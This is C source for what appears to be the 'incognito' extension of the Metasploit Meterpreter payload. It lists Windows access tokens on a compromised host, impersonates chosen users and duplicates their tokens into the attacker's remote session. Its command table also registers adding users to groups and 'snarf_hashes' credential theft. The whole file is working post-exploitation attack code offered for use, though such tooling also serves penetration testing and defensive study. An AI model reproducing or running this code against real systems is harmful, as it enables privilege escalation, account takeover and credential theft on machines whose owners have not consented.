/*
 * This module implements token manipulation features
 */
#define _CRT_SECURE_NO_DEPRECATE 1
#include "../../common/common.h"
#include <psapi.h>
#include "incognito.h"
#include "token_info.h"
#include "list_tokens.h"
#include "user_management.h"
#include "hash_stealer.h"
#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

DWORD request_incognito_list_tokens(Remote *remote, Packet *packet);
DWORD request_incognito_impersonate_user(Remote *remote, Packet *packet);

DWORD request_incognito_list_tokens(Remote *remote, Packet *packet)
{
	DWORD num_unique_tokens = 0, num_tokens = 0, i;
	unique_user_token *uniq_tokens = calloc(BUF_SIZE, sizeof(unique_user_token));
	SavedToken *token_list = NULL;
	BOOL bTokensAvailable = FALSE;
	TOKEN_ORDER token_order;
	TOKEN_PRIVS token_privs;
	char *delegation_tokens = calloc(sizeof(char), BUF_SIZE);
	char *impersonation_tokens = calloc(sizeof(char), BUF_SIZE);

	Packet *response = packet_create_response(packet);
	token_order = packet_get_tlv_value_uint(packet, TLV_TYPE_INCOGNITO_LIST_TOKENS_TOKEN_ORDER);

	dprintf("[INCOGNITO] Enumerating tokens");
	// Enumerate tokens
	token_list = get_token_list(&num_tokens, &token_privs);

	if (!token_list)
	{
		dprintf("[INCOGNITO] Enumerating tokens failed with %u (%x)", GetLastError(), GetLastError());
		packet_transmit_response(GetLastError(), remote, response);

		free(uniq_tokens);
		free(delegation_tokens);
		free(impersonation_tokens);

		return ERROR_SUCCESS;
	}

	dprintf("[INCOGNITO] Enumerating tokens succeeded, processing tokens");
	// Process all tokens to get determinue unique names and delegation abilities
	for (i = 0; i < num_tokens; i++)
	{
		if (token_list[i].token)
		{
			dprintf("[INCOGNITO] Processing Token %x %s", token_list[i].token, token_list[i].username);
			process_user_token(token_list[i].token, uniq_tokens, &num_unique_tokens, token_order);
			CloseHandle(token_list[i].token);
			dprintf("[INCOGNITO] Processed Token %x %s", token_list[i].token, token_list[i].username);
		}
		else
		{
			dprintf("[INCOGNITO] Skipping token %u", i);
		}
	}

	// Sort by name and then display all delegation and impersonation tokens
	dprintf("[INCOGNITO] sorting tokens");
	qsort(uniq_tokens, num_unique_tokens, sizeof(unique_user_token), compare_token_names);

	for (i = 0; i < num_unique_tokens; i++)
	if (uniq_tokens[i].delegation_available)
	{
		bTokensAvailable = TRUE;
		char *username = wchar_to_utf8(uniq_tokens[i].username);
		if (username) {
			strncat(delegation_tokens, username, BUF_SIZE - strlen(delegation_tokens) - 1);
			strncat(delegation_tokens, "\n", BUF_SIZE - strlen(delegation_tokens) - 1);
			free(username);
		}
	}

	if (!bTokensAvailable)
	{
		strncat(delegation_tokens, "No tokens available\n", BUF_SIZE - strlen(delegation_tokens) - 1);
	}

	bTokensAvailable = FALSE;

	for (i = 0; i < num_unique_tokens; i++)
	{
		if (!uniq_tokens[i].delegation_available && uniq_tokens[i].impersonation_available)
		{
			bTokensAvailable = TRUE;
			char *username = wchar_to_utf8(uniq_tokens[i].username);
			if (username) {
				strncat(impersonation_tokens, username, BUF_SIZE - strlen(impersonation_tokens) - 1);
				strncat(impersonation_tokens, "\n", BUF_SIZE - strlen(impersonation_tokens) - 1);
				free(username);
			}
		}
	}

	if (!bTokensAvailable)
	{
		strncat(impersonation_tokens, "No tokens available\n", BUF_SIZE - strlen(impersonation_tokens) - 1);
	}

	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_LIST_TOKENS_DELEGATION, delegation_tokens);
	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_LIST_TOKENS_IMPERSONATION, impersonation_tokens);
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	free(token_list);
	free(uniq_tokens);
	free(delegation_tokens);
	free(impersonation_tokens);

	return ERROR_SUCCESS;
}

DWORD request_incognito_impersonate_token(Remote *remote, Packet *packet)
{
	DWORD num_unique_tokens = 0, num_tokens = 0, i;
	unique_user_token *uniq_tokens = calloc(BUF_SIZE, sizeof(unique_user_token));
	SavedToken *token_list = NULL;
	BOOL bTokensAvailable = FALSE, delegation_available = FALSE;
	char return_value[BUF_SIZE] = "";
	HANDLE xtoken;
	TOKEN_PRIVS token_privs;

	Packet *response = packet_create_response(packet);
	char *impersonate_token = packet_get_tlv_value_string(packet, TLV_TYPE_INCOGNITO_IMPERSONATE_TOKEN);
	wchar_t *requested_username = utf8_to_wchar(impersonate_token);

	// Enumerate tokens
	token_list = get_token_list(&num_tokens, &token_privs);

	if (!token_list)
	{
		goto cleanup;
	}

	// Process all tokens to get determinue unique names and delegation abilities
	for (i=0;i<num_tokens;i++)
	if (token_list[i].token)
	{
		process_user_token(token_list[i].token, uniq_tokens, &num_unique_tokens, BY_USER);
		process_user_token(token_list[i].token, uniq_tokens, &num_unique_tokens, BY_GROUP);
	}

	for (i=0;i<num_unique_tokens;i++)
	{
		if (!_wcsicmp(uniq_tokens[i].username, requested_username)) //&& uniq_tokens[i].impersonation_available)
		{
			if (uniq_tokens[i].delegation_available)
				delegation_available = TRUE;
			if (delegation_available)
				strncat(return_value, "[+] Delegation token available\n", sizeof(return_value)-strlen(return_value)-1);
			else
				strncat(return_value, "[-] No delegation token available\n", sizeof(return_value)-strlen(return_value)-1);

			for (i=0;i<num_tokens;i++)
			{
				if (is_token(token_list[i].token, requested_username))
				if (ImpersonateLoggedOnUser(token_list[i].token))
				{
					char *username = wchar_to_utf8(token_list[i].username);
					if (username) {
						strncat(return_value, "[+] Successfully impersonated user ", sizeof(return_value)-strlen(return_value)-1);
						strncat(return_value, username, sizeof(return_value)-strlen(return_value)-1);
						strncat(return_value, "\n", sizeof(return_value)-strlen(return_value)-1);

						if (!DuplicateTokenEx(token_list[i].token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &xtoken)) {
							dprintf("[INCOGNITO] Failed to duplicate token for %s (%u)", username, GetLastError());
						} else {
							core_update_thread_token(remote, xtoken);
						}
						free(username);
					}
					goto cleanup;
				}
			}
		}
	}

	strncat(return_value, "[-] User token ", sizeof(return_value)-strlen(return_value)-1);
	strncat(return_value, impersonate_token, sizeof(return_value)-strlen(return_value)-1);
	strncat(return_value, " not found\n", sizeof(return_value)-strlen(return_value)-1);

cleanup:
	for (i=0;i<num_tokens;i++)
		CloseHandle(token_list[i].token);
	free(token_list);
	free(uniq_tokens);

	packet_add_tlv_string(response, TLV_TYPE_INCOGNITO_GENERIC_RESPONSE, return_value);
	packet_transmit_response(ERROR_SUCCESS, remote, response);

	return ERROR_SUCCESS;
}

Command customCommands[] =
{
	COMMAND_REQ( "incognito_list_tokens", request_incognito_list_tokens ),
	COMMAND_REQ( "incognito_impersonate_token", request_incognito_impersonate_token ),
	COMMAND_REQ( "incognito_add_user", request_incognito_add_user ),
	COMMAND_REQ( "incognito_add_group_user", request_incognito_add_group_user ),
	COMMAND_REQ( "incognito_add_localgroup_user", request_incognito_add_localgroup_user ),
	COMMAND_REQ( "incognito_snarf_hashes", request_incognito_snarf_hashes ),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	hMetSrv = remote->met_srv;

	command_register_all( customCommands );

	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension.
 * @param remote Pointer to the remote instance.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	command_deregister_all( customCommands );

	return ERROR_SUCCESS;
}

/*!
 * @brief Get the name of the extension.
 * @param buffer Pointer to the buffer to write the name to.
 * @param bufferSize Size of the \c buffer parameter.
 * @return Indication of success or failure.
 */
DWORD __declspec(dllexport) GetExtensionName(char* buffer, int bufferSize)
{
	strncpy_s(buffer, bufferSize, "incognito", bufferSize - 1);
	return ERROR_SUCCESS;
}
